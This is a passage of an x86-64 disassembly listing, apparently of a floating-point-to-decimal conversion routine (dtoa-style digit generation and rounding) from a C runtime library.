   32c48560d:	f2 0f 59 05 b3 6b 00 	mulsd  0x6bb3(%rip),%xmm0        # 0x32c48c1c8
   32c485614:	00 
   32c485615:	81 ee 35 04 00 00    	sub    $0x435,%esi
   32c48561b:	f2 0f 58 05 ad 6b 00 	addsd  0x6bad(%rip),%xmm0        # 0x32c48c1d0
   32c485622:	00 
   32c485623:	85 f6                	test   %esi,%esi
   32c485625:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   32c485629:	7e 14                	jle    0x32c48563f
   32c48562b:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c48562f:	f2 0f 2a ce          	cvtsi2sd %esi,%xmm1
   32c485633:	f2 0f 59 0d a5 6b 00 	mulsd  0x6ba5(%rip),%xmm1        # 0x32c48c1e0
   32c48563a:	00 
   32c48563b:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   32c48563f:	f2 0f 2c f0          	cvttsd2si %xmm0,%esi
   32c485643:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c485647:	66 0f 2f c8          	comisd %xmm0,%xmm1
   32c48564b:	89 74 24 4c          	mov    %esi,0x4c(%rsp)
   32c48564f:	0f 87 83 05 00 00    	ja     0x32c485bd8
   32c485655:	89 ce                	mov    %ecx,%esi
   32c485657:	89 c0                	mov    %eax,%eax
   32c485659:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   32c48565e:	c1 e6 14             	shl    $0x14,%esi
   32c485661:	01 f2                	add    %esi,%edx
   32c485663:	89 d2                	mov    %edx,%edx
   32c485665:	48 c1 e2 20          	shl    $0x20,%rdx
   32c485669:	48 09 d0             	or     %rdx,%rax
   32c48566c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   32c485673:	00 
   32c485674:	48 89 c6             	mov    %rax,%rsi
   32c485677:	44 89 f8             	mov    %r15d,%eax
   32c48567a:	29 c8                	sub    %ecx,%eax
   32c48567c:	8d 48 ff             	lea    -0x1(%rax),%ecx
   32c48567f:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   32c485683:	41 83 f8 16          	cmp    $0x16,%r8d
   32c485687:	0f 87 33 01 00 00    	ja     0x32c4857c0
   32c48568d:	48 8b 0d ac 6d 00 00 	mov    0x6dac(%rip),%rcx        # 0x32c48c440
   32c485694:	49 63 d0             	movslq %r8d,%rdx
   32c485697:	66 48 0f 6e ee       	movq   %rsi,%xmm5
   32c48569c:	f2 0f 10 04 d1       	movsd  (%rcx,%rdx,8),%xmm0
   32c4856a1:	66 0f 2f c5          	comisd %xmm5,%xmm0
   32c4856a5:	0f 87 95 05 00 00    	ja     0x32c485c40
   32c4856ab:	85 c0                	test   %eax,%eax
   32c4856ad:	0f 8e f9 0f 00 00    	jle    0x32c4866ac
   32c4856b3:	44 01 44 24 50       	add    %r8d,0x50(%rsp)
   32c4856b8:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   32c4856bf:	00 00 00 00 
   32c4856c3:	44 89 44 24 70       	mov    %r8d,0x70(%rsp)
   32c4856c8:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   32c4856cf:	00 
   32c4856d0:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%rsp)
   32c4856d7:	00 
   32c4856d8:	e9 33 01 00 00       	jmp    0x32c485810
   32c4856dd:	0f 1f 00             	nopl   (%rax)
   32c4856e0:	31 f6                	xor    %esi,%esi
   32c4856e2:	83 f8 04             	cmp    $0x4,%eax
   32c4856e5:	75 61                	jne    0x32c485748
   32c4856e7:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   32c4856ed:	41 c7 45 00 00 80 ff 	movl   $0xffff8000,0x0(%r13)
   32c4856f4:	ff 
   32c4856f5:	4c 89 f2             	mov    %r14,%rdx
   32c4856f8:	48 8d 0d ba 6a 00 00 	lea    0x6aba(%rip),%rcx        # 0x32c48c1b9
   32c4856ff:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   32c485706:	5b                   	pop    %rbx
   32c485707:	5e                   	pop    %rsi
   32c485708:	5f                   	pop    %rdi
   32c485709:	5d                   	pop    %rbp
   32c48570a:	41 5c                	pop    %r12
   32c48570c:	41 5d                	pop    %r13
   32c48570e:	41 5e                	pop    %r14
   32c485710:	41 5f                	pop    %r15
   32c485712:	e9 69 fa ff ff       	jmp    0x32c485180
   32c485717:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48571e:	00 00 
   32c485720:	48 89 d9             	mov    %rbx,%rcx
   32c485723:	e8 a8 1b 00 00       	call   0x32c4872d0
   32c485728:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c48572e:	41 c7 45 00 01 00 00 	movl   $0x1,0x0(%r13)
   32c485735:	00 
   32c485736:	4c 89 f2             	mov    %r14,%rdx
   32c485739:	48 8d 0d 7d 6a 00 00 	lea    0x6a7d(%rip),%rcx        # 0x32c48c1bd
   32c485740:	e8 3b fa ff ff       	call   0x32c485180
   32c485745:	48 89 c6             	mov    %rax,%rsi
   32c485748:	48 89 f0             	mov    %rsi,%rax
   32c48574b:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   32c485752:	5b                   	pop    %rbx
   32c485753:	5e                   	pop    %rsi
   32c485754:	5f                   	pop    %rdi
   32c485755:	5d                   	pop    %rbp
   32c485756:	41 5c                	pop    %r12
   32c485758:	41 5d                	pop    %r13
   32c48575a:	41 5e                	pop    %r14
   32c48575c:	41 5f                	pop    %r15
   32c48575e:	c3                   	ret
   32c48575f:	90                   	nop
   32c485760:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   32c485766:	41 c7 45 00 00 80 ff 	movl   $0xffff8000,0x0(%r13)
   32c48576d:	ff 
   32c48576e:	4c 89 f2             	mov    %r14,%rdx
   32c485771:	48 8d 0d 38 6a 00 00 	lea    0x6a38(%rip),%rcx        # 0x32c48c1b0
   32c485778:	eb 85                	jmp    0x32c4856ff
   32c48577a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c485780:	c7 43 14 00 00 00 00 	movl   $0x0,0x14(%rbx)
   32c485787:	e9 c6 fd ff ff       	jmp    0x32c485552
   32c48578c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c485790:	89 c2                	mov    %eax,%edx
   32c485792:	48 89 d9             	mov    %rbx,%rcx
   32c485795:	e8 66 17 00 00       	call   0x32c486f00
   32c48579a:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
   32c4857a1:	8b 74 24 28          	mov    0x28(%rsp),%esi
   32c4857a5:	44 8b 54 24 4c       	mov    0x4c(%rsp),%r10d
   32c4857aa:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   32c4857af:	01 c6                	add    %eax,%esi
   32c4857b1:	41 29 c7             	sub    %eax,%r15d
   32c4857b4:	89 74 24 58          	mov    %esi,0x58(%rsp)
   32c4857b8:	e9 c8 fd ff ff       	jmp    0x32c485585
   32c4857bd:	0f 1f 00             	nopl   (%rax)
   32c4857c0:	c7 84 24 80 00 00 00 	movl   $0x1,0x80(%rsp)
   32c4857c7:	01 00 00 00 
   32c4857cb:	8b 74 24 50          	mov    0x50(%rsp),%esi
   32c4857cf:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   32c4857d6:	00 
   32c4857d7:	85 f6                	test   %esi,%esi
   32c4857d9:	79 13                	jns    0x32c4857ee
   32c4857db:	ba 01 00 00 00       	mov    $0x1,%edx
   32c4857e0:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   32c4857e7:	00 
   32c4857e8:	29 c2                	sub    %eax,%edx
   32c4857ea:	89 54 24 60          	mov    %edx,0x60(%rsp)
   32c4857ee:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c4857f2:	85 c0                	test   %eax,%eax
   32c4857f4:	0f 89 ae 08 00 00    	jns    0x32c4860a8
   32c4857fa:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c4857fe:	29 44 24 60          	sub    %eax,0x60(%rsp)
   32c485802:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
   32c485809:	00 
   32c48580a:	f7 d8                	neg    %eax
   32c48580c:	89 44 24 68          	mov    %eax,0x68(%rsp)
   32c485810:	83 ff 09             	cmp    $0x9,%edi
   32c485813:	0f 87 37 02 00 00    	ja     0x32c485a50
   32c485819:	83 ff 05             	cmp    $0x5,%edi
   32c48581c:	0f 8f de 03 00 00    	jg     0x32c485c00
   32c485822:	41 81 c3 fd 03 00 00 	add    $0x3fd,%r11d
   32c485829:	31 c0                	xor    %eax,%eax
   32c48582b:	41 81 fb f7 07 00 00 	cmp    $0x7f7,%r11d
   32c485832:	0f 96 c0             	setbe  %al
   32c485835:	89 84 24 90 00 00 00 	mov    %eax,0x90(%rsp)
   32c48583c:	83 ff 04             	cmp    $0x4,%edi
   32c48583f:	0f 84 07 08 00 00    	je     0x32c48604c
   32c485845:	83 ff 05             	cmp    $0x5,%edi
   32c485848:	0f 84 1e 0e 00 00    	je     0x32c48666c
   32c48584e:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
   32c485855:	00 00 00 00 
   32c485859:	83 ff 02             	cmp    $0x2,%edi
   32c48585c:	0f 84 f5 07 00 00    	je     0x32c486057
   32c485862:	83 ff 03             	cmp    $0x3,%edi
   32c485865:	0f 85 e7 01 00 00    	jne    0x32c485a52
   32c48586b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   32c48586f:	03 44 24 4c          	add    0x4c(%rsp),%eax
   32c485873:	44 89 4c 24 64       	mov    %r9d,0x64(%rsp)
   32c485878:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c48587c:	83 c0 01             	add    $0x1,%eax
   32c48587f:	89 44 24 48          	mov    %eax,0x48(%rsp)
   32c485883:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c48588a:	44 89 94 24 9c 00 00 	mov    %r10d,0x9c(%rsp)
   32c485891:	00 
   32c485892:	85 c0                	test   %eax,%eax
   32c485894:	0f 8e 96 0c 00 00    	jle    0x32c486530
   32c48589a:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   32c48589e:	e8 9d f8 ff ff       	call   0x32c485140
   32c4858a3:	44 8b 94 24 9c 00 00 	mov    0x9c(%rsp),%r10d
   32c4858aa:	00 
   32c4858ab:	44 8b 4c 24 64       	mov    0x64(%rsp),%r9d
   32c4858b0:	48 89 c6             	mov    %rax,%rsi
   32c4858b3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c4858b8:	8b 48 0c             	mov    0xc(%rax),%ecx
   32c4858bb:	83 e9 01             	sub    $0x1,%ecx
   32c4858be:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   32c4858c2:	74 23                	je     0x32c4858e7
   32c4858c4:	b8 02 00 00 00       	mov    $0x2,%eax
   32c4858c9:	0f 49 c1             	cmovns %ecx,%eax
   32c4858cc:	41 83 e1 08          	and    $0x8,%r9d
   32c4858d0:	89 44 24 64          	mov    %eax,0x64(%rsp)
   32c4858d4:	89 c2                	mov    %eax,%edx
   32c4858d6:	0f 84 74 06 00 00    	je     0x32c485f50
   32c4858dc:	b8 03 00 00 00       	mov    $0x3,%eax
   32c4858e1:	29 d0                	sub    %edx,%eax
   32c4858e3:	89 44 24 64          	mov    %eax,0x64(%rsp)
   32c4858e7:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c4858eb:	83 f8 0e             	cmp    $0xe,%eax
   32c4858ee:	0f 87 5c 06 00 00    	ja     0x32c485f50
   32c4858f4:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
   32c4858fb:	85 c9                	test   %ecx,%ecx
   32c4858fd:	0f 84 4d 06 00 00    	je     0x32c485f50
   32c485903:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   32c485907:	0b 4c 24 4c          	or     0x4c(%rsp),%ecx
   32c48590b:	0f 85 3f 06 00 00    	jne    0x32c485f50
   32c485911:	f2 0f 10 84 24 88 00 	movsd  0x88(%rsp),%xmm0
   32c485918:	00 00 
   32c48591a:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
   32c485921:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
   32c485928:	00 00 00 00 
   32c48592c:	85 d2                	test   %edx,%edx
   32c48592e:	74 12                	je     0x32c485942
   32c485930:	f2 0f 10 25 b8 68 00 	movsd  0x68b8(%rip),%xmm4        # 0x32c48c1f0
   32c485937:	00 
   32c485938:	66 0f 2f e0          	comisd %xmm0,%xmm4
   32c48593c:	0f 87 9f 05 00 00    	ja     0x32c485ee1
   32c485942:	66 0f 28 c8          	movapd %xmm0,%xmm1
   32c485946:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   32c48594a:	f2 0f 58 0d a6 68 00 	addsd  0x68a6(%rip),%xmm1        # 0x32c48c1f8
   32c485951:	00 
   32c485952:	66 48 0f 7e c8       	movq   %xmm1,%rax
   32c485957:	66 0f 7e ca          	movd   %xmm1,%edx
   32c48595b:	48 c1 e8 20          	shr    $0x20,%rax
   32c48595f:	2d 00 00 40 03       	sub    $0x3400000,%eax
   32c485964:	48 c1 e0 20          	shl    $0x20,%rax
   32c485968:	48 09 c2             	or     %rax,%rdx
   32c48596b:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c48596f:	49 89 d1             	mov    %rdx,%r9
   32c485972:	85 c0                	test   %eax,%eax
   32c485974:	0f 84 9b 05 00 00    	je     0x32c485f15
   32c48597a:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   32c48597f:	45 31 db             	xor    %r11d,%r11d
   32c485982:	48 8b 0d b7 6a 00 00 	mov    0x6ab7(%rip),%rcx        # 0x32c48c440
   32c485989:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   32c48598d:	48 98                	cltq
   32c48598f:	f2 0f 10 14 c1       	movsd  (%rcx,%rax,8),%xmm2
   32c485994:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   32c48599b:	85 c0                	test   %eax,%eax
   32c48599d:	0f 84 aa 0e 00 00    	je     0x32c48684d
   32c4859a3:	f2 0f 10 0d 85 68 00 	movsd  0x6885(%rip),%xmm1        # 0x32c48c230
   32c4859aa:	00 
   32c4859ab:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
   32c4859af:	66 49 0f 6e e9       	movq   %r9,%xmm5
   32c4859b4:	48 8d 46 01          	lea    0x1(%rsi),%rax
   32c4859b8:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   32c4859bc:	66 0f ef d2          	pxor   %xmm2,%xmm2
   32c4859c0:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
   32c4859c4:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   32c4859c8:	83 c2 30             	add    $0x30,%edx
   32c4859cb:	88 16                	mov    %dl,(%rsi)
   32c4859cd:	f2 0f 5c cd          	subsd  %xmm5,%xmm1
   32c4859d1:	66 0f 2f c8          	comisd %xmm0,%xmm1
   32c4859d5:	0f 87 d4 11 00 00    	ja     0x32c486baf
   32c4859db:	f2 0f 10 25 0d 68 00 	movsd  0x680d(%rip),%xmm4        # 0x32c48c1f0
   32c4859e2:	00 
   32c4859e3:	f2 0f 10 1d 15 68 00 	movsd  0x6815(%rip),%xmm3        # 0x32c48c200
   32c4859ea:	00 
   32c4859eb:	eb 49                	jmp    0x32c485a36
   32c4859ed:	0f 1f 00             	nopl   (%rax)
   32c4859f0:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
   32c4859f7:	83 c2 01             	add    $0x1,%edx
   32c4859fa:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
   32c485a01:	44 39 c2             	cmp    %r8d,%edx
   32c485a04:	0f 8d 30 13 00 00    	jge    0x32c486d3a
   32c485a0a:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
   32c485a0e:	66 0f ef d2          	pxor   %xmm2,%xmm2
   32c485a12:	48 83 c0 01          	add    $0x1,%rax
   32c485a16:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
   32c485a1a:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
   32c485a1e:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
   32c485a22:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   32c485a26:	83 c2 30             	add    $0x30,%edx
   32c485a29:	88 50 ff             	mov    %dl,-0x1(%rax)
   32c485a2c:	66 0f 2f c8          	comisd %xmm0,%xmm1
   32c485a30:	0f 87 79 11 00 00    	ja     0x32c486baf
   32c485a36:	66 0f 28 d4          	movapd %xmm4,%xmm2
   32c485a3a:	f2 0f 5c d0          	subsd  %xmm0,%xmm2
   32c485a3e:	66 0f 2f ca          	comisd %xmm2,%xmm1
   32c485a42:	76 ac                	jbe    0x32c4859f0
   32c485a44:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   32c485a48:	e9 63 01 00 00       	jmp    0x32c485bb0
   32c485a4d:	0f 1f 00             	nopl   (%rax)
   32c485a50:	31 ff                	xor    %edi,%edi
   32c485a52:	66 0f ef c0          	pxor   %xmm0,%xmm0
   32c485a56:	44 89 54 24 30       	mov    %r10d,0x30(%rsp)
   32c485a5b:	f2 41 0f 2a c2       	cvtsi2sd %r10d,%xmm0
   32c485a60:	f2 0f 59 05 80 67 00 	mulsd  0x6780(%rip),%xmm0        # 0x32c48c1e8
   32c485a67:	00 
   32c485a68:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
   32c485a6c:	83 c1 03             	add    $0x3,%ecx
   32c485a6f:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
   32c485a76:	e8 c5 f6 ff ff       	call   0x32c485140
   32c485a7b:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   32c485a80:	44 8b 54 24 30       	mov    0x30(%rsp),%r10d
   32c485a85:	48 89 c6             	mov    %rax,%rsi
   32c485a88:	45 85 c0             	test   %r8d,%r8d
   32c485a8b:	0f 88 c4 01 00 00    	js     0x32c485c55
   32c485a91:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   32c485a96:	48 63 44 24 4c       	movslq 0x4c(%rsp),%rax
   32c485a9b:	3b 42 14             	cmp    0x14(%rdx),%eax
   32c485a9e:	0f 8f b1 01 00 00    	jg     0x32c485c55
   32c485aa4:	48 8b 15 95 69 00 00 	mov    0x6995(%rip),%rdx        # 0x32c48c440
   32c485aab:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c485ab2:	00 
   32c485ab3:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%rsp)
   32c485aba:	ff 
   32c485abb:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   32c485ac0:	f2 0f 10 84 24 88 00 	movsd  0x88(%rsp),%xmm0
   32c485ac7:	00 00 
   32c485ac9:	8b 7c 24 4c          	mov    0x4c(%rsp),%edi
   32c485acd:	48 8d 46 01          	lea    0x1(%rsi),%rax
   32c485ad1:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
   32c485ad8:	01 00 00 00 
   32c485adc:	66 0f 28 c8          	movapd %xmm0,%xmm1
   32c485ae0:	83 c7 01             	add    $0x1,%edi
   32c485ae3:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   32c485ae7:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   32c485aeb:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
   32c485aef:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c485af3:	f2 0f 2a ca          	cvtsi2sd %edx,%xmm1
   32c485af7:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   32c485afb:	8d 4a 30             	lea    0x30(%rdx),%ecx
   32c485afe:	88 0e                	mov    %cl,(%rsi)
   32c485b00:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   32c485b04:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c485b08:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   32c485b0c:	7a 06                	jp     0x32c485b14
   32c485b0e:	0f 84 7c 03 00 00    	je     0x32c485e90
   32c485b14:	f2 0f 10 25 e4 66 00 	movsd  0x66e4(%rip),%xmm4        # 0x32c48c200
   32c485b1b:	00 
   32c485b1c:	66 0f ef db          	pxor   %xmm3,%xmm3
   32c485b20:	eb 46                	jmp    0x32c485b68
   32c485b22:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c485b28:	f2 0f 59 c4          	mulsd  %xmm4,%xmm0
   32c485b2c:	83 c1 01             	add    $0x1,%ecx
   32c485b2f:	48 83 c0 01          	add    $0x1,%rax
   32c485b33:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
   32c485b3a:	66 0f 28 c8          	movapd %xmm0,%xmm1
   32c485b3e:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   32c485b42:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
   32c485b46:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c485b4a:	f2 0f 2a ca          	cvtsi2sd %edx,%xmm1
   32c485b4e:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   32c485b52:	8d 4a 30             	lea    0x30(%rdx),%ecx
   32c485b55:	88 48 ff             	mov    %cl,-0x1(%rax)
   32c485b58:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   32c485b5c:	66 0f 2e c3          	ucomisd %xmm3,%xmm0
   32c485b60:	7a 06                	jp     0x32c485b68
   32c485b62:	0f 84 28 03 00 00    	je     0x32c485e90
   32c485b68:	8b 8c 24 ac 00 00 00 	mov    0xac(%rsp),%ecx
   32c485b6f:	3b 4c 24 48          	cmp    0x48(%rsp),%ecx
   32c485b73:	75 b3                	jne    0x32c485b28
   32c485b75:	8b 7c 24 64          	mov    0x64(%rsp),%edi
   32c485b79:	85 ff                	test   %edi,%edi
   32c485b7b:	0f 84 85 11 00 00    	je     0x32c486d06
   32c485b81:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c485b88:	00 
   32c485b89:	83 ff 01             	cmp    $0x1,%edi
   32c485b8c:	0f 85 fe 02 00 00    	jne    0x32c485e90
   32c485b92:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   32c485b96:	44 8b 5c 24 4c       	mov    0x4c(%rsp),%r11d
   32c485b9b:	eb 13                	jmp    0x32c485bb0
   32c485b9d:	0f 1f 00             	nopl   (%rax)
   32c485ba0:	48 39 f1             	cmp    %rsi,%rcx
   32c485ba3:	0f 84 2f 10 00 00    	je     0x32c486bd8
   32c485ba9:	0f b6 51 ff          	movzbl -0x1(%rcx),%edx
   32c485bad:	48 89 c8             	mov    %rcx,%rax
   32c485bb0:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   32c485bb4:	80 fa 39             	cmp    $0x39,%dl
   32c485bb7:	74 e7                	je     0x32c485ba0
   32c485bb9:	83 c2 01             	add    $0x1,%edx
   32c485bbc:	41 8d 7b 01          	lea    0x1(%r11),%edi
   32c485bc0:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c485bc7:	00 
   32c485bc8:	88 11                	mov    %dl,(%rcx)
   32c485bca:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   32c485bce:	e9 bd 02 00 00       	jmp    0x32c485e90
   32c485bd3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c485bd8:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c485bdc:	f2 0f 2a ce          	cvtsi2sd %esi,%xmm1
   32c485be0:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
   32c485be4:	7a 06                	jp     0x32c485bec
   32c485be6:	0f 84 69 fa ff ff    	je     0x32c485655
   32c485bec:	83 6c 24 4c 01       	subl   $0x1,0x4c(%rsp)
   32c485bf1:	e9 5f fa ff ff       	jmp    0x32c485655
   32c485bf6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c485bfd:	00 00 00 
   32c485c00:	c7 84 24 90 00 00 00 	movl   $0x0,0x90(%rsp)
   32c485c07:	00 00 00 00 
   32c485c0b:	83 ef 04             	sub    $0x4,%edi
   32c485c0e:	83 ff 04             	cmp    $0x4,%edi
   32c485c11:	0f 84 35 04 00 00    	je     0x32c48604c
   32c485c17:	83 ff 05             	cmp    $0x5,%edi
   32c485c1a:	0f 84 4c 0a 00 00    	je     0x32c48666c
   32c485c20:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
   32c485c27:	00 00 00 00 
   32c485c2b:	83 ff 02             	cmp    $0x2,%edi
   32c485c2e:	0f 84 23 04 00 00    	je     0x32c486057
   32c485c34:	bf 03 00 00 00       	mov    $0x3,%edi
   32c485c39:	e9 2d fc ff ff       	jmp    0x32c48586b
   32c485c3e:	66 90                	xchg   %ax,%ax
   32c485c40:	83 6c 24 4c 01       	subl   $0x1,0x4c(%rsp)
   32c485c45:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   32c485c4c:	00 00 00 00 
   32c485c50:	e9 76 fb ff ff       	jmp    0x32c4857cb
   32c485c55:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c485c5a:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   32c485c5e:	45 29 fa             	sub    %r15d,%r10d
   32c485c61:	41 8d 52 01          	lea    0x1(%r10),%edx
   32c485c65:	8b 40 04             	mov    0x4(%rax),%eax
   32c485c68:	44 29 d1             	sub    %r10d,%ecx
   32c485c6b:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
   32c485c72:	39 c8                	cmp    %ecx,%eax
   32c485c74:	0f 8e 8e 0b 00 00    	jle    0x32c486808
   32c485c7a:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c485c81:	00 
   32c485c82:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   32c485c89:	00 
   32c485c8a:	c7 44 24 78 ff ff ff 	movl   $0xffffffff,0x78(%rsp)
   32c485c91:	ff 
   32c485c92:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%rsp)
   32c485c99:	ff 
   32c485c9a:	8b 54 24 58          	mov    0x58(%rsp),%edx
   32c485c9e:	44 8b 5c 24 48       	mov    0x48(%rsp),%r11d
   32c485ca3:	29 c2                	sub    %eax,%edx
   32c485ca5:	83 ff 01             	cmp    $0x1,%edi
   32c485ca8:	0f 9f c1             	setg   %cl
   32c485cab:	45 85 db             	test   %r11d,%r11d
   32c485cae:	8d 42 01             	lea    0x1(%rdx),%eax
   32c485cb1:	0f 9f c2             	setg   %dl
   32c485cb4:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c485cbb:	84 d1                	test   %dl,%cl
   32c485cbd:	74 09                	je     0x32c485cc8
   32c485cbf:	44 39 d8             	cmp    %r11d,%eax
   32c485cc2:	0f 8f 37 11 00 00    	jg     0x32c486dff
   32c485cc8:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   32c485ccc:	8b 54 24 68          	mov    0x68(%rsp),%edx
   32c485cd0:	01 44 24 50          	add    %eax,0x50(%rsp)
   32c485cd4:	01 c8                	add    %ecx,%eax
   32c485cd6:	89 94 24 98 00 00 00 	mov    %edx,0x98(%rsp)
   32c485cdd:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
   32c485ce4:	89 44 24 60          	mov    %eax,0x60(%rsp)
   32c485ce8:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c485ced:	e8 3e 17 00 00       	call   0x32c487430
   32c485cf2:	44 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10d
   32c485cf9:	00 
   32c485cfa:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c485cff:	45 85 d2             	test   %r10d,%r10d
   32c485d02:	74 36                	je     0x32c485d3a
   32c485d04:	44 8b 4c 24 50       	mov    0x50(%rsp),%r9d
   32c485d09:	45 85 c9             	test   %r9d,%r9d
   32c485d0c:	7e 2c                	jle    0x32c485d3a
   32c485d0e:	8b 94 24 88 00 00 00 	mov    0x88(%rsp),%edx
   32c485d15:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   32c485d19:	39 ca                	cmp    %ecx,%edx
   32c485d1b:	89 c8                	mov    %ecx,%eax
   32c485d1d:	0f 4e c2             	cmovle %edx,%eax
   32c485d20:	29 44 24 60          	sub    %eax,0x60(%rsp)
   32c485d24:	29 c2                	sub    %eax,%edx
   32c485d26:	29 c1                	sub    %eax,%ecx
   32c485d28:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c485d2f:	89 94 24 88 00 00 00 	mov    %edx,0x88(%rsp)
   32c485d36:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   32c485d3a:	8b 44 24 68          	mov    0x68(%rsp),%eax
   32c485d3e:	85 c0                	test   %eax,%eax
   32c485d40:	0f 85 af 08 00 00    	jne    0x32c4865f5
   32c485d46:	c7 44 24 68 01 00 00 	movl   $0x1,0x68(%rsp)
   32c485d4d:	00 
   32c485d4e:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c485d53:	e8 d8 16 00 00       	call   0x32c487430
   32c485d58:	83 ff 01             	cmp    $0x1,%edi
   32c485d5b:	0f 9e c2             	setle  %dl
   32c485d5e:	41 83 ff 01          	cmp    $0x1,%r15d
   32c485d62:	49 89 c1             	mov    %rax,%r9
   32c485d65:	0f 94 c0             	sete   %al
   32c485d68:	21 c2                	and    %eax,%edx
   32c485d6a:	8b 44 24 70          	mov    0x70(%rsp),%eax
   32c485d6e:	41 89 d7             	mov    %edx,%r15d
   32c485d71:	85 c0                	test   %eax,%eax
   32c485d73:	0f 85 77 07 00 00    	jne    0x32c4864f0
